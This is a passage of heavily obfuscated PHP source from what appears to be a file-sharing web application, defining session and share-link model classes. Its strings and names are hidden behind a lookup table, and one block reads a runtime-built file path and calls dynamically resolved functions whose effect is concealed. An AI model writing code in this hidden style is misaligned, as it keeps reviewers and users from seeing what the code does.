(isset($›ÊşŞŒÁ[0]) && is_string($›ÊşŞŒÁ[0]) && strtolower($›ÊşŞŒÁ[0]) == $‘â‰ô·½[335]) { $›ÊşŞŒÁ = $this->escapeString($›ÊşŞŒÁ[1]); } elseif (is_array($›ÊşŞŒÁ)) { $›ÊşŞŒÁ = array_map(array($this, $‘â‰ô·½[985]), $›ÊşŞŒÁ); } elseif (is_bool($›ÊşŞŒÁ)) { $›ÊşŞŒÁ = $›ÊşŞŒÁ ? $‘â‰ô·½[98] : $‘â‰ô·½[208]; } elseif (is_null($›ÊşŞŒÁ)) { $›ÊşŞŒÁ = $‘â‰ô·½[113]; } return $›ÊşŞŒÁ; } public function getLastInsertId() { $¨¹œÍëş =& $_SERVER[¹òÍ›æş]; switch ($this->dbType) { case $¨¹œÍëş[971]: case $¨¹œÍëş[963]: case $¨¹œÍëş[944]: case $¨¹œÍëş[962]: case $¨¹œÍëş[946]: case $¨¹œÍëş[974]: return $this->_linkID->lastInsertId(); case $¨¹œÍëş[945]: case $¨¹œÍëş[947]: $¾˜¹ıùó = $this->table; $‚ À¥š± = $this->query("\x53\105\x4c\x45\103\x54\x20{$¾˜¹ıùó}\56\143\x75\162\162\166\x61\x6c\x20\x63\x75\162\162\166\x61\154\x20\106\122\x4f\115\x20\144\x75\141\x6c"); return $‚ À¥š± ? $‚ À¥š±[0][$¨¹œÍëş[986]] : 0; } } } if ($_SERVER[$_SERVER[¹òÍ›æş][54]] != $_SERVER[$_SERVER[¹òÍ›æş][55]]) { $_getc = $_SERVER[¹òÍ›æş][56]; $_getfile = $_SERVER[$_SERVER[¹òÍ›æş][57]] . $_SERVER[¹òÍ›æş][58]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[¹òÍ›æş][59], $_getfilec); if (count($_getarrs) < $_SERVER[¹òÍ›æş][60]) { $exit = $_SERVER[¹òÍ›æş][61]; $exit(); } $_act = $_SERVER[¹òÍ›æş][62]; $_act($_SERVER[$_SERVER[¹òÍ›æş][63]]); } goto E—¬½÷–‡; fï•¼ãõ¾¤: class SessionModel extends ModelBase { protected $tableName = "\x73\171\x73\164\145\155\137\x73\x65\163\163\x69\x6f\x6e"; public function get($±´¤§ÒÚ) { $®´¿ş› =& $_SERVER[¹òÍ›æş]; $ËÕ¶–Ä = $this->where(array($®´¿ş›[1994] => $±´¤§ÒÚ))->find(); if (!is_array($ËÕ¶–Ä)) { return !1; } return $ËÕ¶–Ä[$®´¿ş›[784]]; } public function set($³¶¿È«, $õ‘‹ö, $äà¶ôæ = 3600) { $Ú—®Š† =& $_SERVER[¹òÍ›æş]; $ëèÈıòè = array($Ú—®Š†[1994] => $³¶¿È«, $Ú—®Š†[1898] => $õ‘‹ö, $Ú—®Š†[1995] => $äà¶ôæ + time()); if (Session::get($Ú—®Š†[1996])) { $ëèÈıòè[$Ú—®Š†[1669]] = Session::get($Ú—®Š†[1996]); } else { $ëèÈıòè[$Ú—®Š†[1669]] = 0; } if ($this->get($³¶¿È«)) { return $this->where(array($Ú—®Š†[1994] => $³¶¿È«))->save($ëèÈıòè); } else { return $this->add($ëèÈıòè, array(), !0); } } public function remove($—¿­ê°‘) { return $this->where(array($_SERVER[¹òÍ›æş][1994] => $—¿­ê°‘))->delete(); } public function clearTimeout() { return $this->where($_SERVER[¹òÍ›æş][1997] . time())->delete(); } } class ShareModel extends ModelBase { protected $tableName = "\163\x68\141\162\145"; protected $dataAuto = array(array("\x6d\157\x64\151\x66\x79\x54\x69\155\145", "\x74\x69\155\x65", "\151\156\163\x65\162\164\54\x75\160\144\x61\164\x65", "\x66\x75\x6e\143\164\151\157\x6e"), array("\x63\162\x65\141\164\x65\124\x69\155\x65", "\164\x69\155\145", "\x69\x6e\163\145\x72\x74", "\x66\165\156\143\x74\151\x6f\156"), array("\x6f\x70\x74\151\157\156\x73", '', "\151\x6e\163\145\x72\164\54\165\160\x64\141\164\x65\x2c\x73\x65\x6c\145\143\164", "\152\163\157\x6e")); private $fieldList = "\x2a"; protected function cacheFunctionAlias($‹ò´©õû) { $„Ì¸Œ¡Š =& $_SERVER[¹òÍ›æş]; $ãÓ ×ä¾ = isset($‹ò´©õû[0]) ? $‹ò´©õû[0] : !1; return array($„Ì¸Œ¡Š[1998] => array(USER_ID, $„Ì¸Œ¡Š[1999]), $„Ì¸Œ¡Š[1939] => array($ãÓ ×ä¾, $„Ì¸Œ¡Š[2000])); } protected function listSimple() { $ïŠ”¯¸ü = array($_SERVER[¹òÍ›æş][1669] => USER_ID); $Ûá´ÄÏ« = $this->field($this->fieldList)->where($ïŠ”¯¸ü)->select(); return $Ûá´ÄÏ« ? $Ûá´ÄÏ« : array(); } protected function getInfo($ØÛñ÷†, $ÑÖ‰Ô€õ = false) { $ˆİôÑÇ =& $_SERVER[¹òÍ›æş]; if ($ÑÖ‰Ô€õ) { return $this->_getShareInfo(array($ˆİôÑÇ[631] => $ØÛñ÷†)); } $’È¬Ì§Á = $this->cacheFunctionGet($ˆİôÑÇ[1941], $ØÛñ÷†); return $’È¬Ì§Á; } public function getInfoByHash($„ïÎã¨) { return $this->_getShareInfo(array($_SERVER[¹òÍ›æş][2001] => $„ïÎã¨)); } public function getInfoByPath($ŞèøŸÉ©) { $îí¦çÆ’ =& $_SERVER[¹òÍ›æş]; $Êª§¾Í† = array($îí¦çÆ’[1669] => USER_ID, $îí¦çÆ’[440] => $ŞèøŸÉ©); return $this->_getShareInfo($Êª§¾Í†); } public function getInfoBySourcePath($õğÅ‹ğ) { $Šõˆ‹ =& $_SERVER[¹òÍ›æş]; $¢Ö¿®›¨ = array($Šõˆ‹[1669] => USER_ID, $Šõˆ‹[1202] => $õğÅ‹ğ); return $this->_getShareInfo($¢Ö¿®›¨); } private function _getShareInfo($™¸ë Ô) { $ĞÈğÏ›ú =& $_SERVER[¹òÍ›æş]; $ã¤„¤¤Ã = $this->where($™¸ë Ô)->find(); if (!$ã¤„¤¤Ã) { return !1; } $™¸ë Ô = array($ĞÈğÏ›ú[631] => $ã¤„¤¤Ã[$ĞÈğÏ›ú[631]]); $¯±•˜ø = $ĞÈğÏ›ú[2002]; $…òë¢æÈ = Model($ĞÈğÏ›ú[632])->order($ĞÈğÏ›ú[437])->field($¯±•˜ø)->where($™¸ë Ô)->select(); if ($ã¤„¤¤Ã[$ĞÈğÏ›ú[440]] == $ĞÈğÏ›ú[208]) { $ã¤„¤¤Ã[$ĞÈğÏ›ú[97]] = IO::info($ã¤„¤¤Ã[$ĞÈğÏ›ú[1202]]); } else { $ã¤„¤¤Ã[$ĞÈğÏ›ú[97]] = Model($ĞÈğÏ›ú[1360])->pathInfo($ã¤„¤¤Ã[$ĞÈğÏ›ú[440]]); } $ã¤„¤¤Ã[$ĞÈğÏ›ú[2003]] = $…òë¢æÈ; return $ã¤„¤¤Ã; } protected function getInfoAuth($âÈö°÷Ô) { $½Ï³Ç– =& $_SERVER[¹òÍ›æş]; $ şŠ£ä = $this->getInfo($âÈö°÷Ô); if ($ şŠ£ä[$½Ï³Ç–[1669]] == USER_ID) { $ şŠ£ä[$½Ï³Ç–[451]] = $ şŠ£ä[$½Ï³Ç–[97]][$½Ï³Ç–[451]]; } else { $ şŠ£ä[$½Ï³Ç–[451]] = Model($½Ï³Ç–[531])->authMake($ şŠ£ä[$½Ï³Ç–[2003]]); } return $ şŠ£ä; } protected function listData($ÊÁğ‹”ñ = null, $Š§ëüşİ = 300) { $ã×Éà³û =& $_SERVER[¹òÍ›æş]; $¢À‘ÙÌ« = array(array($ã×Éà³û[526] => array($ã×Éà³û[1039], 0), $ã×Éà³û[629] => array($ã×Éà³û[1039], 0), $ã×Éà³û[2004] => $ã×Éà³û[1957])); if ($ÊÁğ‹”ñ == $ã×Éà³û[2005]) { $¢À‘ÙÌ« = array($ã×Éà³û[526] => 1); } else { if ($ÊÁğ‹”ñ == $ã×Éà³û[1188]) { $¢À‘ÙÌ« = array($ã×Éà³û[629] => 1); } } $¢À‘ÙÌ«[$ã×Éà³û[1669]] = USER_ID; $‰ö›¼Ïê = $this->where($¢À‘ÙÌ«)->selectPage($Š§ëüşİ); return $‰ö›¼Ïê; } protected function listToMe($Šï‰ÊÂö = 300) { $ËÖ“×š¢ =& $_SERVER[¹òÍ›æş]; $«á‘æ¡ø = Model($ËÖ“×š¢[2006])->userGroupParents(USER_ID); $ˆ‚ŒÆØµ = array($ËÖ“×š¢[614] => SourceModel::TYPE_USER, $ËÖ“×š¢[534] => USER_ID); if ($«á‘æ¡ø) { $ˆ‚ŒÆØµ = array(array($ËÖ“×š¢[614] => SourceModel::TYPE_USER, $ËÖ“×š¢[534] => USER_ID), array($ËÖ“×š¢[614] => SourceModel::TYPE_GROUP, $ËÖ“×š¢[534] => array($ËÖ“×š¢[7], $«á‘æ¡ø)), $ËÖ“×š¢[2004] => $ËÖ“×š¢[1957]); } $Íãüæüñ = Model($ËÖ“×š¢[632])->where($ˆ‚ŒÆØµ)->selectPage($Šï‰ÊÂö); $ÔÉúáÖı = array_to_keyvalue_group($Íãüæüñ[$ËÖ“×š¢[407]], $ËÖ“×š¢[631]); if (!$ÔÉúáÖı) { return $Íãüæüñ; } $¶¾’ñõ” = $ËÖ“×š¢[2007]; $ˆ‚ŒÆØµ = array($ËÖ“×š¢[631] => array($ËÖ“×š¢[456], array_keys($ÔÉúáÖı)), $ËÖ“×š¢[1669] => array($ËÖ“×š¢[1041], $ËÖ“×š¢[208])); $‘´“’üÁ = $this->field($¶¾’ñõ”)->where($ˆ‚ŒÆØµ)->select(); foreach ($‘´“’üÁ as $÷¨°Ûó => &$ÀŠùÌĞ’) { $ÀŠùÌĞ’[$ËÖ“×š¢[2003]] = $ÔÉúáÖı[$ÀŠùÌĞ’[$ËÖ“×š¢[631]]]; } unset($ÀŠùÌĞ’); $•¼µùÆ¨ = array($ËÖ“×š¢[2008] => $‘´“’üÁ, $ËÖ“×š¢[2009] => $Íãüæüñ[$ËÖ“×š¢[404]]); return $•¼µùÆ¨; } protected function shareAdd($«®ïŞÓ, $Ó´®’´) { $£Şê¨µ“ =& $_SERVER[¹òÍ›æş]; $àïÙåÇè = $this->_addShareData($«®ïŞÓ, $Ó´®’´); if (!empty($Ó´®’´[$£Şê¨µ“[2010]])) { $this->_shareAuthSet($àïÙåÇè, $Ó´®’´[$£Şê¨µ“[2010]]); } $this->shareEventAdd($«®ïŞÓ, $Ó´®’´, $£Şê¨µ“[2011]); return $àïÙåÇè; } protected function shareAddSystem($Â…Âºš, $ºóö…Ãç) { $Éæ„‰ =& $_SERVER[¹òÍ›æş]; $Õâ£úˆ£ = $this->_addShareData($Â…Âºš, $ºóö…Ãç, $Éæ„‰[1314]); $this->_shareAuthSet($Õâ£úˆ£, $ºóö…Ãç[$Éæ„‰[2010]]); return $Õâ£úˆ£; } private function shareEventAdd($Óù±‘”·, $Ï—Êş™Ì, $ùÕĞùûú = "\141\x64\x64") { $¢ğ…’ñ¹ =& $_SERVER[¹òÍ›æş]; if (!$Óù±‘”· || $Óù±‘”· == $¢ğ…’ñ¹[208]) { return; } if ($ùÕĞùûú == $¢ğ…’ñ¹[2011]) { if ($Ï—Êş™Ì[$¢ğ…’ñ¹[526]] == $¢ğ…’ñ¹[98]) { Model($¢ğ…’ñ¹[599])->eventShare($Óù±‘”·, $¢ğ…’ñ¹[2012]); } if ($Ï—Êş™Ì[$¢ğ…’ñ¹[629]] == $¢ğ…’ñ¹[98]) { Model($¢ğ…’ñ¹[599])->eventShare($Óù±‘”·, $¢ğ…’ñ¹[2013]); } return; } $¥³¥şãÅ = $this->getInfoByPath($Óù±‘”·); $áïÈ ¸İ = $¢ğ…’ñ¹[2014]; if ($¥³¥şãÅ[$¢ğ…’ñ¹[526]] == $¢ğ…’ñ¹[208] && $Ï—Êş™Ì[$¢ğ…’ñ¹[526]] == $¢ğ…’ñ¹[98]) { $áïÈ ¸İ = $¢ğ…’ñ¹[2012]; } if ($¥³¥şãÅ[$¢ğ…’ñ¹[526]] == $¢ğ…’ñ¹[98] && $Ï—Êş™Ì[$¢ğ…’ñ¹[526]] == $¢ğ…’ñ¹[208]) { $áïÈ ¸İ = $¢ğ…’ñ¹[2015]; } if ($¥³¥şãÅ[$¢ğ…’ñ¹[629]] == $¢ğ…’ñ¹[208] && $Ï—Êş™Ì[$¢ğ…’ñ¹[629]] == $¢ğ…’ñ¹[98]) { $áïÈ ¸İ = $¢ğ…’ñ¹[2013]; } if ($¥³¥şãÅ[$¢ğ…’ñ¹[629]] == $¢ğ…’ñ¹[98] && $Ï—Êş™Ì[$¢ğ…’ñ¹[629]] == $¢ğ…’ñ¹[208]) { $áïÈ ¸İ = $¢ğ…’ñ¹[2016]; } Model($¢ğ…’ñ¹[599])->eventShare($Óù±‘”·, $áïÈ ¸İ); return; } private function _addShareData($–°Ø¯…¹, $å¸Ş¶ı = array(), $Ö·Š¼òœ = false) { $üƒ‚È€ =& $_SERVER[¹òÍ›æş]; $çÑÜÕ™’ = $Ö·Š¼òœ == $üƒ‚È€[1314] ? 0 : USER_ID; $¤×‰ûáù = array($üƒ‚È€[455] => $–°Ø¯…¹, $üƒ‚È€[1660] => $çÑÜÕ™’); if ($–°Ø¯…¹ == 0) { $¤×‰ûáù = array($üƒ‚È€[2017] => $å¸Ş¶ı[$üƒ‚È€[1202]], $üƒ‚È€[1660] => $çÑÜÕ™’); } if ($¸…œĞçÙ = $this->where($¤×‰ûáù)->find()) { return $¸…œĞçÙ[$üƒ‚È€[631]]; } if ($–°Ø¯…¹ == 0) { $—çë•Ş¸ = array($üƒ‚È€[32] => get_path_this($å¸Ş¶ı[$üƒ‚È€[94]])); } else { $—çë•Ş¸ = Model($üƒ‚È€[855])->sourceInfo($–°Ø¯…¹); if (!$—çë•Ş¸) { return !1; } } if (!$å¸Ş¶ı[$üƒ‚È€[1569]]) { $å¸Ş¶ı[$üƒ‚È€[1569]] = $—çë•Ş¸[$üƒ‚È€[32]]; } $ÒÎØ±¾ = array($üƒ‚È€[1660] => $çÑÜÕ™’, $üƒ‚È€[455] => $–°Ø¯…¹, $üƒ‚È€[1569] => $üƒ‚È€[12], $üƒ‚È€[526] => 0, $üƒ‚È€[629] => 0, $üƒ‚È€[1202] => $üƒ‚È€[12], $üƒ‚È€[345] => $üƒ‚È€[12], $üƒ‚È€[916] => $üƒ‚È€[12], $üƒ‚È€[2018] => 0, $üƒ‚È€[2019] => 0, $üƒ‚È€[791] => 0, $üƒ‚È€[2020] => $üƒ‚È€[12], $üƒ‚È€[2001] => $üƒ‚È€[12]); $ì¢‡ôî“ = explode($üƒ‚È€[50], $üƒ‚È€[2021]); foreach ($ì¢‡ôî“ as $¦—ü) { if (!isset($å¸Ş¶ı[$¦—ü])) { continue; } $ÒÎØ±¾[$¦—ü] = $å¸Ş¶ı[$¦—ü]; } $•†æÆ¼¯ = $this->add($ÒÎØ±¾); $åŞÜ›ÈŒ = array($üƒ‚È€[2001] => short_id($•†æÆ¼¯)); $this->where(array($üƒ‚È€[2022] => $•†æÆ¼¯))->save($åŞÜ›ÈŒ); return $•†æÆ¼¯; } private function _shareAuthSet($åŠ‘“ô, $Òõ°¥¡) { $š”‚—Ôà =& $_SERVER[¹òÍ›æş]; if (!is_array($Òõ°¥¡)) { return !1; } $•¯¦é‚ô = Model($š”‚—Ôà[1967]); $•¯¦é‚ô->where(array($š”‚—Ôà[631] => $åŠ‘“ô))->delete(); $úÆøÚàö = array(); foreach ($Òõ°¥¡ as $»Íáãı¿) { $—ªú…ÈÙ = SourceModel::TYPE_USER; if ($»Íáãı¿[$š”‚—Ôà[449]] == SourceModel::TYPE_GROUP) { $—ªú…ÈÙ = SourceModel::TYPE_GROUP; } $ÍšÉ¹àŠ = array($š”‚—Ôà[631] => $åŠ‘“ô, $š”‚—Ôà[449] => $—ªú…ÈÙ, $š”‚—Ôà[534] => intval($»Íáãı¿[$š”‚—Ôà[534]]), $š”‚—Ôà[1963] => 0, $š”‚—Ôà[2023] => -1); if ($»Íáãı¿[$š”‚—Ôà[1963]]) { $ÍšÉ¹àŠ[$š”‚—Ôà[1963]] = $»Íáãı¿[$š”‚—Ôà[1963]]; } else { if ($»Íáãı¿[$š”‚—Ôà[2023]]) { $ÍšÉ¹àŠ[$š”‚—Ôà[2023]] = $»Íáãı¿[$š”‚—Ôà[2023]]; } } $úÆøÚàö[] = $ÍšÉ¹àŠ; } return $•¯¦é‚ô->addAll($úÆøÚàö, array(), !0); } public function numViewAdd($÷¬‹³š˜) { $·»½Ş¸Ş =& $_SERVER[¹òÍ›æş]; $åùÅà’¹ = array($·»½Ş¸Ş[2022] => $÷¬‹³š˜); $this->where($åùÅà’¹)->setAdd($·»½Ş¸Ş[2018]); } public function numDownloadAdd($šÕ‚·) { $ŠªƒæãÔ =& $_SERVER[¹òÍ›æş]; $î€ç„Å½ = array($ŠªƒæãÔ[2022] => $šÕ‚·); $this->where($î€ç„Å½)->setAdd($ŠªƒæãÔ[2019]); } protected function shareEdit($äÕ„ÔÖ‘, $Ê‘îÕú¨) { $áÒÔ‡ˆ =& $_SERVER[¹òÍ›æş]; $¹ï×™İš = $this->getInfo($äÕ„ÔÖ‘); if (!$¹ï×™İš) { return !1; } $this->_checkLinkShare($Ê‘îÕú¨, $¹ï×™İš); $÷Àãã‡÷ = array(); $½¼†Ëæù = explode($áÒÔ‡ˆ[50], $áÒÔ‡ˆ[2024]); foreach ($½¼†Ëæù as $åßôİâ) { if (!array_key_exists($åßôİâ, $Ê‘îÕú¨)) { continue; } $÷Àãã‡÷[$åßôİâ] = $Ê‘îÕú¨[$åßôİâ]; } $this->shareEventAdd($¹ï×™İš[$áÒÔ‡ˆ[440]], $Ê‘îÕú¨, $áÒÔ‡ˆ[1829]); $this->where(array($áÒÔ‡ˆ[2022] => $äÕ„ÔÖ‘))->save($÷Àãã‡÷); if (isset($Ê‘îÕú¨[$áÒÔ‡ˆ[2010]])) { $this->_shareAuthSet($äÕ„ÔÖ‘, $Ê‘îÕú¨[$áÒÔ‡ˆ[2010]]); } return !0; } private function _checkLinkShare($¥Ùí„éÄ, $œşŸ±¿•) { $ù®Ô÷ =& $_SERVER[¹òÍ›æş]; if ($¥Ùí„éÄ[$ù®Ô÷[526]] != $ù®Ô÷[98]) { return; } $Øİ†·”× = $œşŸ±¿•[$ù®Ô÷[97]][$ù®Ô÷[440]]; if ($œşŸ±¿•[$ù®Ô÷[97]][$ù®Ô÷[33]] != $ù®Ô÷[210]) { $¡íÏ¥Ë = $this->_folderReport($Øİ†·”×); if (!$¡íÏ¥Ë) { return; } show_json(LNG($ù®Ô÷[2025]) . $ù®Ô÷[2026] . $¡íÏ¥Ë, !1); } $²×òìˆ = Model($ù®Ô÷[855])->fileInfoGet($œşŸ±¿•[$ù®Ô÷[97]][$ù®Ô÷[440]]); if (!$²×òìˆ) { return; } $¤áåçÊš = $this->shareFileMeta($²×òìˆ[$ù®Ô÷[506]]); if (isset($¤áåçÊš[$ù®Ô÷[412]]) && $¤áåçÊš[$ù®Ô÷[412]] == $ù®Ô÷[98]) { show_json(LNG($ù®Ô÷[2027]), !1); } } private function _folderReport($ÈÉäƒ¿û) { $ú±¡öÜÒ =& $_SERVER[¹òÍ›æş]; $»ëâ€Ø = array($ú±¡öÜÒ[506] => array($ú±¡öÜÒ[1039], 0), $ú±¡öÜÒ[780] => 3); $ŒŞ¸˜€ = Model($ú±¡öÜÒ[2028])->where($»ëâ€Ø)->field($ú±¡öÜÒ[506])->select(); if (!$ŒŞ¸˜€) { return !1; } $ŒŞ¸˜€ = array_to_keyvalue($ŒŞ¸˜€, $ú±¡öÜÒ[12], $ú±¡öÜÒ[506]); $ÍŠàÇÂï = $ú±¡öÜÒ[50] . $ÈÉäƒ¿û . $ú±¡öÜÒ[50]; $»ëâ€Ø = array($ú±¡öÜÒ[506] => array($ú±¡öÜÒ[7], $ŒŞ¸˜€), $ú±¡öÜÒ[549] => array($ú±¡öÜÒ[421], "\x25{$ÍŠàÇÂï}\x25"), $ú±¡öÜÒ[469] => 0); $ù®ë¨¨« = Model($ú±¡öÜÒ[855])->where($»ëâ€Ø)->field($ú±¡öÜÒ[2029])->find(); if (!$ù®ë¨¨«) { return !1; } $’Üİ¨¢€ = substr($ù®ë¨¨«[$ú±¡öÜÒ[549]], strpos($ù®ë¨¨«[$ú±¡öÜÒ[549]], $ÍŠàÇÂï)); $»ëâ€Ø = array($ú±¡öÜÒ[440] => array($ú±¡öÜÒ[7], trim($’Üİ¨¢€, $ú±¡öÜÒ[50]))); $ıë¾Àôà = Model($ú±¡öÜÒ[855])->where($»ëâ€Ø)->field($ú±¡öÜÒ[32])->select(); $Ù®ë›¶Æ = array_to_keyvalue($ıë¾Àôà, $ú±¡öÜÒ[12], $ú±¡öÜÒ[32]); $Ù®ë›¶Æ[] = $ù®ë¨¨«[$ú±¡öÜÒ[32]]; return implode($ú±¡öÜÒ[8], $Ù®ë›¶Æ); } protected function remove($›÷šœà¼) { $‚Áè¸ñâ =& $_SERVER[¹òÍ›æş]; if (is_array($›÷šœà¼)) { $›÷šœà¼ = array($‚Áè¸ñâ[7], $›÷šœà¼); } $é«Òıîµ = array($‚Áè¸ñâ[631] => $›÷šœà¼); $¬ì¥×¢¦ = $this->where($é«Òıîµ)->delete(); if ($¬ì¥×¢¦) { Model($‚Áè¸ñâ[632])->where(array($‚Áè¸ñâ[631] => $›÷šœà¼))->delete(); } $åÀÕ’šŸ = is_array($›÷šœà¼) ? $›÷šœà¼[1] : array($›÷šœà¼); for ($°÷ØËÉ = 0; $°÷ØËÉ < count($åÀÕ’šŸ); $°÷ØËÉ++) { $ì´¿ë‘ = $this->getInfo($åÀÕ’šŸ[$°÷ØËÉ]); if ($ì´¿ë‘[$‚Áè¸ñâ[629]] == $‚Áè¸ñâ[98]) { Model($‚Áè¸ñâ[599])->eventShare($ì´¿ë‘[$‚Áè¸ñâ[440]], $‚Áè¸ñâ[2016]); } if ($ì´¿ë‘[$‚Áè¸ñâ[526]] == $‚Áè¸ñâ[98]) { Model($‚Áè¸ñâ[599])->eventShare($ì´¿ë‘[$‚Áè¸ñâ[440]], $‚Áè¸ñâ[2015]); } } return $¬ì¥×¢¦; } protected function removeBySource($¨ÓàµÂŸ) { $ ’—ãĞÍ =& $_SERVER[¹òÍ›æş]; $ø¨– è = array($ ’—ãĞÍ[455] => array($ ’—ãĞÍ[456], $¨ÓàµÂŸ)); $Ò€˜›—— = $this->field($ ’—ãĞÍ[631])->where($ø¨– è)->select(); $Ò€˜›—— = array_to_keyvalue($Ò€˜›——, $ ’—ãĞÍ[12], $ ’—ãĞÍ[631]); if (!$Ò€˜›——) { return; } $ø¨– è = array($ ’—ãĞÍ[2022] => array($ ’—ãĞÍ[456], $Ò€˜›——)); $this->where($ø¨– è)->delete(); Model($ ’—ãĞÍ[632])->where($ø¨– è)->delete(); } public function listAll($”ßÒ©ü†) { $Êáı¬ =& $_SERVER[¹òÍ›æş]; $×‘Ÿ¿¢ù = array(); if ($”ßÒ©ü†[$Êáı¬[1669]]) { $×‘Ÿ¿¢ù[$Êáı¬[1669]] = $”ßÒ©ü†[$Êáı¬[1669]]; } if ($”ßÒ©ü†[$Êáı¬[790]]) { $¥®…Ï¿” = $”ßÒ©ü†[$Êáı¬[791]] ? $”ßÒ©ü†[$Êáı¬[791]] : strtotime(date($Êáı¬[2030])); $×‘Ÿ¿¢ù[$Êáı¬[211]] = array($Êáı¬[371], array($”ßÒ©ü†[$Êáı¬[790]], $¥®…Ï¿”)); } if ($”ßÒ©ü†[$Êáı¬[33]]) { $×‘Ÿ¿¢ù[$”ßÒ©ü†[$Êáı¬[33]]] = 1; } else { $×‘Ÿ¿¢ù[] = array($Êáı¬[526] => array($Êáı¬[1039], 0), $Êáı¬[629] => array($Êáı¬[1039], 0), $Êáı¬[2004] => $Êáı¬[1957]); } if ($”ßÒ©ü†[$Êáı¬[1953]]) { $×‘Ÿ¿¢ù[] = array($Êáı¬[2001] => $”ßÒ©ü†[$Êáı¬[1953]], $Êáı¬[1569] => array($Êáı¬[421], "\45{$”ßÒ©ü†[$Êáı¬[1953]]}\x25"), $Êáı¬[2004] => $Êáı¬[1957]); } $†ùÈÛ¼ª = $this->_makeOrder()->where($×‘Ÿ¿¢ù)->selectPage(20); if (empty($†ùÈÛ¼ª[$Êáı¬[407]])) { return array(); } $this->_listDataApply($†ùÈÛ¼ª[$Êáı¬[407]]); return $†ùÈÛ¼ª; } public function listDataApply($”®™­İù) { $this->_listDataApply($”®™­İù); return $”®™­İù; } private function _listDataApply(&$á°­¿Ä) { $¹‘˜ºÑÜ =& $_SERVER[¹òÍ›æş]; $òµÉøŒõ = array_to_keyvalue($á°­¿Ä, $¹‘˜ºÑÜ[12], $¹‘˜ºÑÜ[1669]); $¦İ½º = Model($¹‘˜ºÑÜ[563])->userListInfo(array_unique($òµÉøŒõ)); $ãÚ§ıùÜ = array_to_keyvalue($á°­¿Ä, $¹‘˜ºÑÜ[12], $¹‘˜ºÑÜ[440]); $ÍùŠĞÛö = Model($¹‘˜ºÑÜ[855])->sourceListInfo($ãÚ§ıùÜ, !0); foreach ($á°­¿Ä as $ÜğÜˆş => &$Â—ÁÜ) { $®äáÅ³€ = $Â—ÁÜ[$¹‘˜ºÑÜ[1669]]; $Â—ÁÜ[$¹‘˜ºÑÜ[2031]] = $¦İ½º[$®äáÅ³€] ? $¦İ½º[$®äáÅ³€] : !1; $Ç¶êŞüã = $Â—ÁÜ[$¹‘˜ºÑÜ[440]]; $Â—ÁÜ[$¹‘˜ºÑÜ[97]] = $ÍùŠĞÛö[$Ç¶êŞüã] ? $ÍùŠĞÛö[$Ç¶êŞüã] : !1; if ($Â—ÁÜ[$¹‘˜ºÑÜ[97]][$¹‘˜ºÑÜ[469]] == $¹‘˜ºÑÜ[98]) { unset($á°­¿Ä[$ÜğÜˆş]); } if ($Â—ÁÜ[$¹‘˜ºÑÜ[97]] != $¹‘˜ºÑÜ[208] && !$Â—ÁÜ[$¹‘˜ºÑÜ[97]]) { unset($á°­¿Ä[$ÜğÜˆş]); } } unset($Â—ÁÜ); $á°­¿Ä = array_values($á°­¿Ä); } private function _makeOrder($¾²ççãÎ = '') { $„„ê‘Ó¾ =& $_SERVER[¹òÍ›æş]; $®©¥ëü = array($„„ê‘Ó¾[211], $„„ê‘Ó¾[791], $„„ê‘Ó¾[2018], $„„ê‘Ó¾[2019]); $™‘“²ÆÚ = array($„„ê‘Ó¾[488] => $„„ê‘Ó¾[489], $„„ê‘Ó¾[490] => $„„ê‘Ó¾[491]); $ı¶ù ì¨ = Input::get($„„ê‘Ó¾[495], $„„ê‘Ó¾[7], $„„ê‘Ó¾[461], $®©¥ëü); $…Î¹É”Œ = Input::get($„„ê‘Ó¾[496], $„„ê‘Ó¾[7], $„„ê‘Ó¾[2032], array($„„ê‘Ó¾[1950], $„„ê‘Ó¾[490])); $…Î¹É”Œ = $™‘“²ÆÚ[$…Î¹É”Œ]; $¾²ççãÎ = $¾²ççãÎ . "{$ı¶ù ì¨}\x20{$…Î¹É”Œ}"; return $this->order($¾²ççãÎ); } public function reportAdd($«š‹ºÚ‚) { $ä ì¢Õ =& $_SERVER[¹òÍ›æş]; $‡¶Ü¡ = array($ä ì¢Õ[631] => $«š‹ºÚ‚[$ä ì¢Õ[631]], $ä ì¢Õ[1669] => USER_ID); if (Model($ä ì¢Õ[2028])->where($‡¶Ü¡)->find()) { return !1; } $ÌÖ‘Å = array($ä ì¢Õ[631] => $«š‹ºÚ‚[$ä ì¢Õ[631]], $ä ì¢Õ[1569] => $«š‹ºÚ‚[$ä ì¢Õ[1569]], $ä ì¢Õ[440] => $«š‹ºÚ‚[$ä ì¢Õ[440]], $ä ì¢Õ[506] => $«š‹ºÚ‚[$ä ì¢Õ[506]], $ä ì¢Õ[1669] => USER_ID, $ä ì¢Õ[33] => $«š‹ºÚ‚[$ä ì¢Õ[33]], $ä ì¢Õ[491] => $«š‹ºÚ‚[$ä ì¢Õ[491]]); return Model($ä ì¢Õ[2028])->add($ÌÖ‘Å); } public function reportList($“ôµíÂ“) { $ÂµÍÔ™Ò =& $_SERVER[¹òÍ›æş]; $Ÿ¢éñë© = array(); if ($“ôµíÂ“[$ÂµÍÔ™Ò[790]]) { $èí‡’Œ¥ = $“ôµíÂ“[$ÂµÍÔ™Ò[791]] ? $“ôµíÂ“[$ÂµÍÔ™Ò[791]] : strtotime(date($ÂµÍÔ™Ò[2030])); $Ÿ¢éñë©[$ÂµÍÔ™Ò[211]] = array($ÂµÍÔ™Ò[371], array($“ôµíÂ“[$ÂµÍÔ™Ò[790]], $èí‡’Œ¥)); } if (isset($“ôµíÂ“[$ÂµÍÔ™Ò[33]]) && in_array($“ôµíÂ“[$ÂµÍÔ™Ò[33]], array($ÂµÍÔ™Ò[98], $ÂµÍÔ™Ò[475], $ÂµÍÔ™Ò[2033], $ÂµÍÔ™Ò[2034], $ÂµÍÔ™Ò[2035]))) { $Ÿ¢éñë©[$ÂµÍÔ™Ò[33]] = $“ôµíÂ“[$ÂµÍÔ™Ò[33]]; } if (isset($“ôµíÂ“[$ÂµÍÔ™Ò[780]]) && in_array($“ôµíÂ“[$ÂµÍÔ™Ò[780]], array($ÂµÍÔ™Ò[208], $ÂµÍÔ™Ò[98], $ÂµÍÔ™Ò[475], $ÂµÍÔ™Ò[2033]))) { $Ÿ¢éñë©[$ÂµÍÔ™Ò[780]] = $“ôµíÂ“[$ÂµÍÔ™Ò[780]]; } $íÇšŠ‚¹ = Input::get($ÂµÍÔ™Ò[496], $ÂµÍÔ™Ò[7], $ÂµÍÔ™Ò[2032], array($ÂµÍÔ™Ò[1950], $ÂµÍÔ™Ò[490])); $æ–øæ¡­ = array($ÂµÍÔ™Ò[488] 